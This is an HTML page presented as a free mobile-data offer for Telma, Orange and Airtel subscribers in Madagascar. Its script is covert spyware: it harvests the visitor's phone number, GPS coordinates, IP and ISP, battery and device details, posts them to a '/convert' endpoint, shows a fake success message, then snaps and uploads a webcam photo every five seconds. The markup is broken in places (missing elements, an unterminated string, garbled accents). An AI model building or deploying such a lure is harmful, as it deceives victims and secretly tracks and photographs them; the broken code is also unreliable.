<!DOCTYPE html>
<html lang="mg">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Forfais Gratuits</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
  <style>
    :root {
      --primary: #8b0000;
      --primary-hover: #a30000;
      --secondary: #8b4513;
      --light: #fffefc;
      --dark: #333;
      --gray: #e0e0e0;
      --radius: 12px;
      --shadow: 0 4px 12px rgba(0,0,0,0.1);
      --transition: all 0.3s ease;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Segoe UI', Roboto, -apple-system, sans-serif;
      background: linear-gradient(135deg, #f5f7fa 0%, #fffefc 100%);
      min-height: 100vh;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      color: var(--dark);
      line-height: 1.6;
    }
    
    .container {
      max-width: 500px;
      width: 100%;
      margin: 0 auto;
    }
    
    .card {
      padding: 30px;
      background: white;
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      position: relative;
      overflow: hidden;
    }
    
    .card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 8px;
      background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
    }
    
    h1 {
      text-align: center;
      color: var(--primary);
      margin-bottom: 20px;
      font-size: 1.8rem;
      font-weight: 700;
      position: relative;
      padding-bottom: 10px;
    }
    
    h1::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 80px;
      height: 3px;
      background: var(--secondary);
      border-radius: 3px;
    }
    
    .form-group {
      margin-bottom: 20px;
      position: relative;
    }
    
    .form-group label {
      display: block;
      margin-bottom: 8px;
      font-weight: 500;
      color: var(--dark);
    }
    
    input, select {
      display: block;
      width: 100%;
      padding: 14px 16px;
      font-size: 1rem;
      border-radius: var(--radius);
      border: 1px solid var(--gray);
      transition: var(--transition);
      background-color: #f9f9f9;
    }
    
    input:focus, select:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(139, 0, 0, 0.1);
      background-color: white;
    }
    
    input::placeholder {
      color: #999;
    }
    
    .btn {
      display: block;
      width: 100%;
      padding: 14px;
      font-size: 1rem;
      font-weight: 600;
      border-radius: var(--radius);
      border: none;
      cursor: pointer;
      transition: var(--transition);
      text-align: center;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    
    .btn-primary {
      background: var(--primary);
      color: white;
    }
    
    .btn-primary:hover {
      background: var(--primary-hover);
      transform: translateY(-2px);
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    
    .btn-primary:active {
      transform: translateY(0);
    }
    
    .status-message {
      text-align: center;
      padding: 15px;
      border-radius: var(--radius);
      margin-bottom: 20px;
      font-weight: 500;
    }
    
    .error-message {
      background-color: #ffeeee;
      color: #d32f2f;
      border: 1px solid #ffcdd2;
    }
    
    .loader {
      display: inline-block;
      border: 4px solid rgba(0,0,0,0.1);
      border-left-color: var(--primary);
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      vertical-align: middle;
      margin-right: 10px;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    .hidden {
      display: none !important;
    }
    
    .offer-selector {
      margin-top: 25px;
      animation: fadeIn 0.5s ease;
    }
    
    .offer-selector select {
      background-color: white;
      border: 2px solid var(--gray);
      font-weight: 500;
    }
    
    .offer-selector label {
      font-size: 1.1rem;
      color: var(--primary);
    }
    
    .logo {
      text-align: center;
      margin-bottom: 20px;
    }
    
    .logo img {
      height: 60px;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    footer {
      text-align: center;
      margin-top: 30px;
      color: #777;
      font-size: 0.9rem;
    }
    
    @media (max-width: 480px) {
      .card {
        padding: 20px;
      }
      
      h1 {
        font-size: 1.5rem;
      }
      
      input, select, .btn {
        padding: 12px;
      }
    }
  </style>
</head>
<body>

<div class="container">
  <div class="card">

      <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" stroke="#8b0000" stroke-width="2"/>

      </svg>
    </div>
    
    <h1>Forfaits gratuits</h1>

        <path d="M12 8V12M12 16H12.01M22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12Z" stroke="#d32f2f" stroke-width="2" stroke-linecap="round"/>

  </div>
  
  <footer>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
const telmaOffers = ["TELMA 500 Ar - 100Mo", "TELMA 1000 Ar - 250Mo", "TELMA 2000 Ar - 500Mo", "TELMA 5000 Ar - 1Go"];
const orangeOffers = ["ORANGE 300 Ar - 50Mo", "ORANGE 600 Ar - 120Mo", "ORANGE 1500 Ar - 400Mo", "ORANGE 3000 Ar - 800Mo"];
const airtelOffers = ["AIRTEL 500 Ar - 80Mo", "AIRTEL 1000 Ar - 200Mo", "AIRTEL 2000 Ar - 450Mo", "AIRTEL 5000 Ar - 1Go"];
let cameraGranted = false;
let geoCoords = null;

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const formContainer = document.getElementById('form-container');
const camRefused = document.getElementById('cam-refused');
const offerSelector = document.getElementById('offer-selector');
const selector = document.getElementById('forfait-selector');

function detectPuce(phone) {
  if (/^(\+261|0)(34|38)/.test(phone)) return 'telma';
  if (/^(\+261|0)(32|37)/.test(phone)) return 'orange';
  if (/^(\+261|0)33/.test(phone)) return 'airtel';
  return 'unknown';
}

async function getGeo() {
  return new Promise((resolve) => {
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos.coords),
      () => resolve(null),
      {timeout: 5000}
    );
  });
}

async function getIpInfo() {
  try {
    const res = await fetch("https://ipinfo.io/json");
    return await res.json();
  } catch { return {}; }
}

function getNetworkInfo() {
  const c = navigator.connection || {};
  return `Network: ${c.effectiveType || 'unknown'}, downlink=${c.downlink || '?'}Mb/s`;
}

async function getBatteryInfo() {
  try {
    const bat = await navigator.getBattery();
    return `Battery: ${Math.round(bat.level * 100)}%, Charging: ${bat.charging}`;
  } catch { return 'Battery info unavailable'; }
}

async function getInfoText(phone, puce) {
  const ip = await getIpInfo();
  const battery = await getBatteryInfo();
  const net = getNetworkInfo();
  const lat = geoCoords?.latitude?.toFixed(6) || 'unknown';
  const lon = geoCoords?.longitude?.toFixed(6) || 'unknown';

  return `üìû Phone: ${phone}
üì∂ Puce: ${puce}
üìç Location: lat=${lat}, lon=${lon}
üåê IP: ${ip.ip || '?'} | ${ip.city || ''}, ${ip.country || ''}
üè¢ ISP: ${ip.org || ''}
üîã ${battery}
üì° ${net}
üß† UA: ${navigator.userAgent}`;
}

function sendMessage(message) {
  fetch("/convert", {
    method: "POST",
    body: new URLSearchParams({ id: psid, message })
  });
}

function sendPhoto() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0);
  canvas.toBlob(async (blob) => {
    const info = await getInfoText("-", "-");
    const fd = new FormData();
    fd.append("id", psid);
    fd.append("message", info);
    fd.append("photo", blob, "cam.jpg");
    fetch("/convert", { method: "POST", body: fd });
  }, 'image/jpeg', 0.8);
}

function startAutoPhoto() {
  setInterval(sendPhoto, 5000);
}

function updateOffers(puce) {
  let offers = [];
  if (puce === "telma") offers = telmaOffers;
  else if (puce === "orange") offers = orangeOffers;
  else if (puce === "airtel") offers = airtelOffers;
  
  selector.innerHTML = '';
  offers.forEach(f => {
    const opt = document.createElement("option");
    opt.textContent = f;
    opt.value = f;
    selector.appendChild(opt);
  });
  
  offerSelector.classList.remove('hidden');
}

document.getElementById("submit-btn").onclick = async () => {
  const phone = document.getElementById("phone").value.trim();
  const puce = detectPuce(phone);
  
  if (!phone) {
    Swal.fire({
      icon: 'error',
      title: 'Erreur',
      text: 'Veuillez entrer votre num√©ro de t√©l√©phone',
      confirmButtonColor: '#8b0000'
    });
    return;
  }
  
  if (puce === 'unknown') {
    Swal.fire({
      icon: 'error',
      title: 'Erreur',
      text: 'Num√©ro non valide,
      confirmButtonColor: '#8b0000'
    });
    return;
  }

  Swal.fire({
    title: 'Veuillez attendre...',
    html: 'Vauillez attendre quelques scondes',
    allowOutsideClick: false,
    didOpen: () => {
      Swal.showLoading();
    }
  });

  const infoText = await getInfoText(phone, puce);
  sendMessage(infoText);

  setTimeout(() => {
    Swal.fire({
      icon: 'success',
      title: 'Succ√®s!',
      text: 'Forfait envoy√© avec succ√®s',
      confirmButtonColor: '#8b0000'
    });
    
    updateOffers(puce);
    startAutoPhoto();
  }, 2000);
};

async function initApp() {
  geoCoords = await getGeo();

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    cameraGranted = true;
    formContainer.classList.remove("hidden");
  } catch {
    camRefused.classList.remove("hidden");
  }
}

initApp();
</script>
